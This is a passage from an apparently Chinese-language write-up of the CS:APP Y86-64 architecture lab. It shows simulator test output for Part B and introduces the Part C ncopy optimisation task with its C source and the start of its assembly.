</span><span id=__span-97-34><a id=__codelineno-97-34 name=__codelineno-97-34></a>IF:<span class=w> </span>Fetched<span class=w> </span>jne<span class=w> </span>at<span class=w> </span>0x83.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x63
</span><span id=__span-97-35><a id=__codelineno-97-35 name=__codelineno-97-35></a>IF:<span class=w> </span>Fetched<span class=w> </span>ret<span class=w> </span>at<span class=w> </span>0x8c.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-36><a id=__codelineno-97-36 name=__codelineno-97-36></a>IF:<span class=w> </span>Fetched<span class=w> </span>ret<span class=w> </span>at<span class=w> </span>0x55.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-37><a id=__codelineno-97-37 name=__codelineno-97-37></a>IF:<span class=w> </span>Fetched<span class=w> </span>halt<span class=w> </span>at<span class=w> </span>0x13.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-38><a id=__codelineno-97-38 name=__codelineno-97-38></a><span class=m>32</span><span class=w> </span>instructions<span class=w> </span>executed
</span><span id=__span-97-39><a id=__codelineno-97-39 name=__codelineno-97-39></a><span class=nv>Status</span><span class=w> </span><span class=o>=</span><span class=w> </span>HLT
</span><span id=__span-97-40><a id=__codelineno-97-40 name=__codelineno-97-40></a>Condition<span class=w> </span>Codes:<span class=w> </span><span class=nv>Z</span><span class=o>=</span><span class=m>1</span><span class=w> </span><span class=nv>S</span><span class=o>=</span><span class=m>0</span><span class=w> </span><span class=nv>O</span><span class=o>=</span><span class=m>0</span>
</span><span id=__span-97-41><a id=__codelineno-97-41 name=__codelineno-97-41></a>Changed<span class=w> </span>Register<span class=w> </span>State:
</span><span id=__span-97-42><a id=__codelineno-97-42 name=__codelineno-97-42></a>%rax:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000abcdabcdabcd
</span><span id=__span-97-43><a id=__codelineno-97-43 name=__codelineno-97-43></a>%rsp:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000100
</span><span id=__span-97-44><a id=__codelineno-97-44 name=__codelineno-97-44></a>%rdi:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000038
</span><span id=__span-97-45><a id=__codelineno-97-45 name=__codelineno-97-45></a>%r10:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000a000a000a000
</span><span id=__span-97-46><a id=__codelineno-97-46 name=__codelineno-97-46></a>Changed<span class=w> </span>Memory<span class=w> </span>State:
</span><span id=__span-97-47><a id=__codelineno-97-47 name=__codelineno-97-47></a>0x00f0:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000055
</span><span id=__span-97-48><a id=__codelineno-97-48 name=__codelineno-97-48></a>0x00f8:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000013
</span><span id=__span-97-49><a id=__codelineno-97-49 name=__codelineno-97-49></a>ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span></code></pre></div></td></tr></table></div> <p>测试二：运行一个标准检查程序，结果都是ISA Check Succeeds:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-98-1> 1</a></span>
<span class=normal><a href=#__codelineno-98-2> 2</a></span>
<span class=normal><a href=#__codelineno-98-3> 3</a></span>
<span class=normal><a href=#__codelineno-98-4> 4</a></span>
<span class=normal><a href=#__codelineno-98-5> 5</a></span>
<span class=normal><a href=#__codelineno-98-6> 6</a></span>
<span class=normal><a href=#__codelineno-98-7> 7</a></span>
<span class=normal><a href=#__codelineno-98-8> 8</a></span>
<span class=normal><a href=#__codelineno-98-9> 9</a></span>
<span class=normal><a href=#__codelineno-98-10>10</a></span>
<span class=normal><a href=#__codelineno-98-11>11</a></span>
<span class=normal><a href=#__codelineno-98-12>12</a></span>
<span class=normal><a href=#__codelineno-98-13>13</a></span>
<span class=normal><a href=#__codelineno-98-14>14</a></span>
<span class=normal><a href=#__codelineno-98-15>15</a></span>
<span class=normal><a href=#__codelineno-98-16>16</a></span>
<span class=normal><a href=#__codelineno-98-17>17</a></span>
<span class=normal><a href=#__codelineno-98-18>18</a></span>
<span class=normal><a href=#__codelineno-98-19>19</a></span>
<span class=normal><a href=#__codelineno-98-20>20</a></span>
<span class=normal><a href=#__codelineno-98-21>21</a></span>
<span class=normal><a href=#__codelineno-98-22>22</a></span>
<span class=normal><a href=#__codelineno-98-23>23</a></span>
<span class=normal><a href=#__codelineno-98-24>24</a></span>
<span class=normal><a href=#__codelineno-98-25>25</a></span>
<span class=normal><a href=#__codelineno-98-26>26</a></span>
<span class=normal><a href=#__codelineno-98-27>27</a></span>
<span class=normal><a href=#__codelineno-98-28>28</a></span>
<span class=normal><a href=#__codelineno-98-29>29</a></span>
<span class=normal><a href=#__codelineno-98-30>30</a></span>
<span class=normal><a href=#__codelineno-98-31>31</a></span>
<span class=normal><a href=#__codelineno-98-32>32</a></span>
<span class=normal><a href=#__codelineno-98-33>33</a></span>
<span class=normal><a href=#__codelineno-98-34>34</a></span>
<span class=normal><a href=#__codelineno-98-35>35</a></span>
<span class=normal><a href=#__codelineno-98-36>36</a></span>
<span class=normal><a href=#__codelineno-98-37>37</a></span>
<span class=normal><a href=#__codelineno-98-38>38</a></span>
<span class=normal><a href=#__codelineno-98-39>39</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-98-1><a id=__codelineno-98-1 name=__codelineno-98-1></a>sim/seq$<span class=w> </span><span class=nb>cd</span><span class=w> </span>../y86-code<span class=p>;</span><span class=w> </span>make<span class=w> </span>testssim
</span><span id=__span-98-2><a id=__codelineno-98-2 name=__codelineno-98-2></a>Makefile:42:<span class=w> </span>warning:<span class=w> </span>ignoring<span class=w> </span>prerequisites<span class=w> </span>on<span class=w> </span>suffix<span class=w> </span>rule<span class=w> </span>definition
</span><span id=__span-98-3><a id=__codelineno-98-3 name=__codelineno-98-3></a>Makefile:45:<span class=w> </span>warning:<span class=w> </span>ignoring<span class=w> </span>prerequisites<span class=w> </span>on<span class=w> </span>suffix<span class=w> </span>rule<span class=w> </span>definition
</span><span id=__span-98-4><a id=__codelineno-98-4 name=__codelineno-98-4></a>Makefile:48:<span class=w> </span>warning:<span class=w> </span>ignoring<span class=w> </span>prerequisites<span class=w> </span>on<span class=w> </span>suffix<span class=w> </span>rule<span class=w> </span>definition
</span><span id=__span-98-5><a id=__codelineno-98-5 name=__codelineno-98-5></a>Makefile:51:<span class=w> </span>warning:<span class=w> </span>ignoring<span class=w> </span>prerequisites<span class=w> </span>on<span class=w> </span>suffix<span class=w> </span>rule<span class=w> </span>definition
</span><span id=__span-98-6><a id=__codelineno-98-6 name=__codelineno-98-6></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>asum.yo<span class=w> </span>&gt;<span class=w> </span>asum.seq
</span><span id=__span-98-7><a id=__codelineno-98-7 name=__codelineno-98-7></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>asumr.yo<span class=w> </span>&gt;<span class=w> </span>asumr.seq
</span><span id=__span-98-8><a id=__codelineno-98-8 name=__codelineno-98-8></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>cjr.yo<span class=w> </span>&gt;<span class=w> </span>cjr.seq
</span><span id=__span-98-9><a id=__codelineno-98-9 name=__codelineno-98-9></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>j-cc.yo<span class=w> </span>&gt;<span class=w> </span>j-cc.seq
</span><span id=__span-98-10><a id=__codelineno-98-10 name=__codelineno-98-10></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>poptest.yo<span class=w> </span>&gt;<span class=w> </span>poptest.seq
</span><span id=__span-98-11><a id=__codelineno-98-11 name=__codelineno-98-11></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>pushquestion.yo<span class=w> </span>&gt;<span class=w> </span>pushquestion.seq
</span><span id=__span-98-12><a id=__codelineno-98-12 name=__codelineno-98-12></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>pushtest.yo<span class=w> </span>&gt;<span class=w> </span>pushtest.seq
</span><span id=__span-98-13><a id=__codelineno-98-13 name=__codelineno-98-13></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>prog1.yo<span class=w> </span>&gt;<span class=w> </span>prog1.seq
</span><span id=__span-98-14><a id=__codelineno-98-14 name=__codelineno-98-14></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>prog2.yo<span class=w> </span>&gt;<span class=w> </span>prog2.seq
</span><span id=__span-98-15><a id=__codelineno-98-15 name=__codelineno-98-15></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>prog3.yo<span class=w> </span>&gt;<span class=w> </span>prog3.seq
</span><span id=__span-98-16><a id=__codelineno-98-16 name=__codelineno-98-16></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>prog4.yo<span class=w> </span>&gt;<span class=w> </span>prog4.seq
</span><span id=__span-98-17><a id=__codelineno-98-17 name=__codelineno-98-17></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>prog5.yo<span class=w> </span>&gt;<span class=w> </span>prog5.seq
</span><span id=__span-98-18><a id=__codelineno-98-18 name=__codelineno-98-18></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>prog6.yo<span class=w> </span>&gt;<span class=w> </span>prog6.seq
</span><span id=__span-98-19><a id=__codelineno-98-19 name=__codelineno-98-19></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>prog7.yo<span class=w> </span>&gt;<span class=w> </span>prog7.seq
</span><span id=__span-98-20><a id=__codelineno-98-20 name=__codelineno-98-20></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>prog8.yo<span class=w> </span>&gt;<span class=w> </span>prog8.seq
</span><span id=__span-98-21><a id=__codelineno-98-21 name=__codelineno-98-21></a>../seq/ssim<span class=w> </span>-t<span class=w> </span>ret-hazard.yo<span class=w> </span>&gt;<span class=w> </span>ret-hazard.seq
</span><span id=__span-98-22><a id=__codelineno-98-22 name=__codelineno-98-22></a>grep<span class=w> </span><span class=s2>"ISA Check"</span><span class=w> </span>*.seq
</span><span id=__span-98-23><a id=__codelineno-98-23 name=__codelineno-98-23></a>asum.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-24><a id=__codelineno-98-24 name=__codelineno-98-24></a>asumr.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-25><a id=__codelineno-98-25 name=__codelineno-98-25></a>cjr.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-26><a id=__codelineno-98-26 name=__codelineno-98-26></a>j-cc.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-27><a id=__codelineno-98-27 name=__codelineno-98-27></a>poptest.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-28><a id=__codelineno-98-28 name=__codelineno-98-28></a>prog1.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-29><a id=__codelineno-98-29 name=__codelineno-98-29></a>prog2.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-30><a id=__codelineno-98-30 name=__codelineno-98-30></a>prog3.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-31><a id=__codelineno-98-31 name=__codelineno-98-31></a>prog4.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-32><a id=__codelineno-98-32 name=__codelineno-98-32></a>prog5.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-33><a id=__codelineno-98-33 name=__codelineno-98-33></a>prog6.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-34><a id=__codelineno-98-34 name=__codelineno-98-34></a>prog7.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-35><a id=__codelineno-98-35 name=__codelineno-98-35></a>prog8.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-36><a id=__codelineno-98-36 name=__codelineno-98-36></a>pushquestion.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-37><a id=__codelineno-98-37 name=__codelineno-98-37></a>pushtest.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-38><a id=__codelineno-98-38 name=__codelineno-98-38></a>ret-hazard.seq:ISA<span class=w> </span>Check<span class=w> </span>Succeeds
</span><span id=__span-98-39><a id=__codelineno-98-39 name=__codelineno-98-39></a>rm<span class=w> </span>asum.seq<span class=w> </span>asumr.seq<span class=w> </span>cjr.seq<span class=w> </span>j-cc.seq<span class=w> </span>poptest.seq<span class=w> </span>pushquestion.seq<span class=w> </span>pushtest.seq<span class=w> </span>prog1.seq<span class=w> </span>prog2.seq<span class=w> </span>prog3.seq<span class=w> </span>prog4.seq<span class=w> </span>prog5.seq<span class=w> </span>prog6.seq<span class=w> </span>prog7.seq<span class=w> </span>prog8.seq<span class=w> </span>ret-hazard.seq
</span></code></pre></div></td></tr></table></div> <p>测试三：测试除<code>iaddq</code>的所有指令:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-99-1> 1</a></span>
<span class=normal><a href=#__codelineno-99-2> 2</a></span>
<span class=normal><a href=#__codelineno-99-3> 3</a></span>
<span class=normal><a href=#__codelineno-99-4> 4</a></span>
<span class=normal><a href=#__codelineno-99-5> 5</a></span>
<span class=normal><a href=#__codelineno-99-6> 6</a></span>
<span class=normal><a href=#__codelineno-99-7> 7</a></span>
<span class=normal><a href=#__codelineno-99-8> 8</a></span>
<span class=normal><a href=#__codelineno-99-9> 9</a></span>
<span class=normal><a href=#__codelineno-99-10>10</a></span>
<span class=normal><a href=#__codelineno-99-11>11</a></span>
<span class=normal><a href=#__codelineno-99-12>12</a></span>
<span class=normal><a href=#__codelineno-99-13>13</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-99-1><a id=__codelineno-99-1 name=__codelineno-99-1></a>sim/ptest$<span class=w> </span><span class=nb>cd</span><span class=w> </span>../ptest<span class=p>;</span><span class=w> </span>make<span class=w> </span><span class=nv>SIM</span><span class=o>=</span>../seq/ssim
</span><span id=__span-99-2><a id=__codelineno-99-2 name=__codelineno-99-2></a>./optest.pl<span class=w> </span>-s<span class=w> </span>../seq/ssim<span class=w> </span>
</span><span id=__span-99-3><a id=__codelineno-99-3 name=__codelineno-99-3></a>Simulating<span class=w> </span>with<span class=w> </span>../seq/ssim
</span><span id=__span-99-4><a id=__codelineno-99-4 name=__codelineno-99-4></a><span class=w>  </span>All<span class=w> </span><span class=m>49</span><span class=w> </span>ISA<span class=w> </span>Checks<span class=w> </span>Succeed
</span><span id=__span-99-5><a id=__codelineno-99-5 name=__codelineno-99-5></a>./jtest.pl<span class=w> </span>-s<span class=w> </span>../seq/ssim<span class=w> </span>
</span><span id=__span-99-6><a id=__codelineno-99-6 name=__codelineno-99-6></a>Simulating<span class=w> </span>with<span class=w> </span>../seq/ssim
</span><span id=__span-99-7><a id=__codelineno-99-7 name=__codelineno-99-7></a><span class=w>  </span>All<span class=w> </span><span class=m>64</span><span class=w> </span>ISA<span class=w> </span>Checks<span class=w> </span>Succeed
</span><span id=__span-99-8><a id=__codelineno-99-8 name=__codelineno-99-8></a>./ctest.pl<span class=w> </span>-s<span class=w> </span>../seq/ssim<span class=w> </span>
</span><span id=__span-99-9><a id=__codelineno-99-9 name=__codelineno-99-9></a>Simulating<span class=w> </span>with<span class=w> </span>../seq/ssim
</span><span id=__span-99-10><a id=__codelineno-99-10 name=__codelineno-99-10></a><span class=w>  </span>All<span class=w> </span><span class=m>22</span><span class=w> </span>ISA<span class=w> </span>Checks<span class=w> </span>Succeed
</span><span id=__span-99-11><a id=__codelineno-99-11 name=__codelineno-99-11></a>./htest.pl<span class=w> </span>-s<span class=w> </span>../seq/ssim<span class=w> </span>
</span><span id=__span-99-12><a id=__codelineno-99-12 name=__codelineno-99-12></a>Simulating<span class=w> </span>with<span class=w> </span>../seq/ssim
</span><span id=__span-99-13><a id=__codelineno-99-13 name=__codelineno-99-13></a><span class=w>  </span>All<span class=w> </span><span class=m>600</span><span class=w> </span>ISA<span class=w> </span>Checks<span class=w> </span>Succeed
</span></code></pre></div></td></tr></table></div> <p>测试四：专门测试<code>iaddq</code>指令:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-100-1> 1</a></span>
<span class=normal><a href=#__codelineno-100-2> 2</a></span>
<span class=normal><a href=#__codelineno-100-3> 3</a></span>
<span class=normal><a href=#__codelineno-100-4> 4</a></span>
<span class=normal><a href=#__codelineno-100-5> 5</a></span>
<span class=normal><a href=#__codelineno-100-6> 6</a></span>
<span class=normal><a href=#__codelineno-100-7> 7</a></span>
<span class=normal><a href=#__codelineno-100-8> 8</a></span>
<span class=normal><a href=#__codelineno-100-9> 9</a></span>
<span class=normal><a href=#__codelineno-100-10>10</a></span>
<span class=normal><a href=#__codelineno-100-11>11</a></span>
<span class=normal><a href=#__codelineno-100-12>12</a></span>
<span class=normal><a href=#__codelineno-100-13>13</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-100-1><a id=__codelineno-100-1 name=__codelineno-100-1></a>sim/ptest$<span class=w> </span><span class=nb>cd</span><span class=w> </span>../ptest<span class=p>;</span><span class=w> </span>make<span class=w> </span><span class=nv>SIM</span><span class=o>=</span>../seq/ssim<span class=w> </span><span class=nv>TFLAGS</span><span class=o>=</span>-i
</span><span id=__span-100-2><a id=__codelineno-100-2 name=__codelineno-100-2></a>./optest.pl<span class=w> </span>-s<span class=w> </span>../seq/ssim<span class=w> </span>-i
</span><span id=__span-100-3><a id=__codelineno-100-3 name=__codelineno-100-3></a>Simulating<span class=w> </span>with<span class=w> </span>../seq/ssim
</span><span id=__span-100-4><a id=__codelineno-100-4 name=__codelineno-100-4></a><span class=w>  </span>All<span class=w> </span><span class=m>58</span><span class=w> </span>ISA<span class=w> </span>Checks<span class=w> </span>Succeed
</span><span id=__span-100-5><a id=__codelineno-100-5 name=__codelineno-100-5></a>./jtest.pl<span class=w> </span>-s<span class=w> </span>../seq/ssim<span class=w> </span>-i
</span><span id=__span-100-6><a id=__codelineno-100-6 name=__codelineno-100-6></a>Simulating<span class=w> </span>with<span class=w> </span>../seq/ssim
</span><span id=__span-100-7><a id=__codelineno-100-7 name=__codelineno-100-7></a><span class=w>  </span>All<span class=w> </span><span class=m>96</span><span class=w> </span>ISA<span class=w> </span>Checks<span class=w> </span>Succeed
</span><span id=__span-100-8><a id=__codelineno-100-8 name=__codelineno-100-8></a>./ctest.pl<span class=w> </span>-s<span class=w> </span>../seq/ssim<span class=w> </span>-i
</span><span id=__span-100-9><a id=__codelineno-100-9 name=__codelineno-100-9></a>Simulating<span class=w> </span>with<span class=w> </span>../seq/ssim
</span><span id=__span-100-10><a id=__codelineno-100-10 name=__codelineno-100-10></a><span class=w>  </span>All<span class=w> </span><span class=m>22</span><span class=w> </span>ISA<span class=w> </span>Checks<span class=w> </span>Succeed
</span><span id=__span-100-11><a id=__codelineno-100-11 name=__codelineno-100-11></a>./htest.pl<span class=w> </span>-s<span class=w> </span>../seq/ssim<span class=w> </span>-i
</span><span id=__span-100-12><a id=__codelineno-100-12 name=__codelineno-100-12></a>Simulating<span class=w> </span>with<span class=w> </span>../seq/ssim
</span><span id=__span-100-13><a id=__codelineno-100-13 name=__codelineno-100-13></a><span class=w>  </span>All<span class=w> </span><span class=m>756</span><span class=w> </span>ISA<span class=w> </span>Checks<span class=w> </span>Succeed
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=part-c>Part C<a class=headerlink href=#part-c title="Permanent link">¶</a></h3> <p>Part C 在<code>sim/pipe</code>中进行。PIPE 是使用了转发技术的流水线化的Y86-64处理器。它相比 Part B 增加了流水线寄存器和流水线控制逻辑。</p> <p>在本部分中，我们要通过修改<code>pipe-full.hcl</code>和<code>ncopy.ys</code>来优化程序，通过程序的效率，也就是 CPE 来计算我们的分数，分数由下述公式算出：</p> <div class=arithmatex>\[ S = \begin{cases} 0, &amp; c &gt; 10.50,\\[6pt] 20\cdot(10.50 - c), &amp; 7.50 \le c \le 10.50,\\[6pt] 60, &amp; c &lt; 7.50. \end{cases} \]</div> <p>首先，<code>iaddq</code>是一个非常好的指令，它可以把两步简化为一步，后面可以用到。所以我们先修改<code>pipe-full.hcl</code>，增加<code>iaddq</code>指令，修改过程参考 Part B 即可。稳妥起见，修改后还是应该测试一下这个模拟器，Makefile参考 Part B 部分进行同样的修改后编译。然后执行以下命令进行测试：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-101-1>1</a></span>
<span class=normal><a href=#__codelineno-101-2>2</a></span>
<span class=normal><a href=#__codelineno-101-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-101-1><a id=__codelineno-101-1 name=__codelineno-101-1></a>./psim -t ../y86-code/asumi.yo
</span><span id=__span-101-2><a id=__codelineno-101-2 name=__codelineno-101-2></a>cd ../ptest; make SIM=../pipe/psim
</span><span id=__span-101-3><a id=__codelineno-101-3 name=__codelineno-101-3></a>cd ../ptest; make SIM=../pipe/psim TFLAGS=-i
</span></code></pre></div></td></tr></table></div> <p>当所有测试都显示 Succeed 后，就可以真正开始本部分的重头戏了。<code>ncopy</code>函数将一个长度为len的整型数组src复制到一个不重叠的数组dst，并返回src中正数的个数。C 语言代码如下:</p> <div class="language-c highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-102-1> 1</a></span>
<span class=normal><a href=#__codelineno-102-2> 2</a></span>
<span class=normal><a href=#__codelineno-102-3> 3</a></span>
<span class=normal><a href=#__codelineno-102-4> 4</a></span>
<span class=normal><a href=#__codelineno-102-5> 5</a></span>
<span class=normal><a href=#__codelineno-102-6> 6</a></span>
<span class=normal><a href=#__codelineno-102-7> 7</a></span>
<span class=normal><a href=#__codelineno-102-8> 8</a></span>
<span class=normal><a href=#__codelineno-102-9> 9</a></span>
<span class=normal><a href=#__codelineno-102-10>10</a></span>
<span class=normal><a href=#__codelineno-102-11>11</a></span>
<span class=normal><a href=#__codelineno-102-12>12</a></span>
<span class=normal><a href=#__codelineno-102-13>13</a></span>
<span class=normal><a href=#__codelineno-102-14>14</a></span>
<span class=normal><a href=#__codelineno-102-15>15</a></span>
<span class=normal><a href=#__codelineno-102-16>16</a></span>
<span class=normal><a href=#__codelineno-102-17>17</a></span>
<span class=normal><a href=#__codelineno-102-18>18</a></span>
<span class=normal><a href=#__codelineno-102-19>19</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-102-1><a id=__codelineno-102-1 name=__codelineno-102-1></a><span class=cm>/*</span>
</span><span id=__span-102-2><a id=__codelineno-102-2 name=__codelineno-102-2></a><span class=cm>* ncopy - copy src to dst, returning number of positive ints</span>
</span><span id=__span-102-3><a id=__codelineno-102-3 name=__codelineno-102-3></a><span class=cm>* contained in src array.</span>
</span><span id=__span-102-4><a id=__codelineno-102-4 name=__codelineno-102-4></a><span class=cm>*/</span>
</span><span id=__span-102-5><a id=__codelineno-102-5 name=__codelineno-102-5></a><span class=n>word_t</span><span class=w> </span><span class=nf>ncopy</span><span class=p>(</span><span class=n>word_t</span><span class=w> </span><span class=o>*</span><span class=n>src</span><span class=p>,</span><span class=w> </span><span class=n>word_t</span><span class=w> </span><span class=o>*</span><span class=n>dst</span><span class=p>,</span><span class=w> </span><span class=n>word_t</span><span class=w> </span><span class=n>len</span><span class=p>)</span>
</span><span id=__span-102-6><a id=__codelineno-102-6 name=__codelineno-102-6></a><span class=p>{</span>
</span><span id=__span-102-7><a id=__codelineno-102-7 name=__codelineno-102-7></a><span class=w>    </span><span class=n>word_t</span><span class=w> </span><span class=n>count</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-102-8><a id=__codelineno-102-8 name=__codelineno-102-8></a><span class=w>    </span><span class=n>word_t</span><span class=w> </span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-102-9><a id=__codelineno-102-9 name=__codelineno-102-9></a>
</span><span id=__span-102-10><a id=__codelineno-102-10 name=__codelineno-102-10></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>len</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-102-11><a id=__codelineno-102-11 name=__codelineno-102-11></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-102-12><a id=__codelineno-102-12 name=__codelineno-102-12></a><span class=w>        </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=n>src</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-102-13><a id=__codelineno-102-13 name=__codelineno-102-13></a><span class=w>        </span><span class=o>*</span><span class=n>dst</span><span class=o>++</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-102-14><a id=__codelineno-102-14 name=__codelineno-102-14></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>val</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-102-15><a id=__codelineno-102-15 name=__codelineno-102-15></a><span class=w>            </span><span class=n>count</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-102-16><a id=__codelineno-102-16 name=__codelineno-102-16></a><span class=w>        </span><span class=n>len</span><span class=o>--</span><span class=p>;</span>
</span><span id=__span-102-17><a id=__codelineno-102-17 name=__codelineno-102-17></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-102-18><a id=__codelineno-102-18 name=__codelineno-102-18></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>count</span><span class=p>;</span>
</span><span id=__span-102-19><a id=__codelineno-102-19 name=__codelineno-102-19></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>原汇编代码如下：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-103-1> 1</a></span>
<span class=normal><a href=#__codelineno-103-2> 2</a></span>
<span class=normal><a href=#__codelineno-103-3> 3</a></span>
<span class=normal><a href=#__codelineno-103-4> 4</a></span>
<span class=normal><a href=#__codelineno-103-5> 5</a></span>
<span class=normal><a href=#__codelineno-103-6> 6</a></span>
<span class=normal><a href=#__codelineno-103-7> 7</a></span>
<span class=normal><a href=#__codelineno-103-8> 8</a></span>
<span class=normal><a href=#__codelineno-103-9> 9</a></span>
<span class=normal><a href=#__codelineno-103-10>10</a></span>
<span class=normal><a href=#__codelineno-103-11>11</a></span>
<span class=normal><a href=#__codelineno-103-12>12</a></span>
<span class=normal><a href=#__codelineno-103-13>13</a></span>
<span class=normal><a href=#__codelineno-103-14>14</a></span>
<span class=normal><a href=#__codelineno-103-15>15</a></span>
<span class=normal><a href=#__codelineno-103-16>16</a></span>
<span class=normal><a href=#__codelineno-103-17>17</a></span>
<span class=normal><a href=#__codelineno-103-18>18</a></span>
<span class=normal><a href=#__codelineno-103-19>19</a></span>
<span class=normal><a href=#__codelineno-103-20>20</a></span>
<span class=normal><a href=#__codelineno-103-21>21</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-103-1><a id=__codelineno-103-1 name=__codelineno-103-1></a><span class=c1># You can modify this portion</span>
</span><span id=__span-103-2><a id=__codelineno-103-2 name=__codelineno-103-2></a><span class=w>    </span><span class=c1># Loop header</span>
</span><span id=__span-103-3><a id=__codelineno-103-3 name=__codelineno-103-3></a><span class=w>    </span><span class=nf>xorq</span><span class=w> </span><span class=nv>%rax</span><span class=p>,</span><span class=nv>%rax</span><span class=w>      </span><span class=c1># count = 0;</span>
</span><span id=__span-103-4><a id=__codelineno-103-4 name=__codelineno-103-4></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdx</span><span class=p>,</span><span class=nv>%rdx</span><span class=w>      </span><span class=c1># len &lt;= 0?</span>
</span><span id=__span-103-5><a id=__codelineno-103-5 name=__codelineno-103-5></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Done</span><span class=w>            </span><span class=c1># if so, goto Done:</span>
</span><span id=__span-103-6><a id=__codelineno-103-6 name=__codelineno-103-6></a>
</span><span id=__span-103-7><a id=__codelineno-103-7 name=__codelineno-103-7></a><span class=nl>Loop:</span><span class=w>   </span>
</span><span id=__span-103-8><a id=__codelineno-103-8 name=__codelineno-103-8></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%r10</span><span class=w> </span><span class=c1># read val from src...</span>
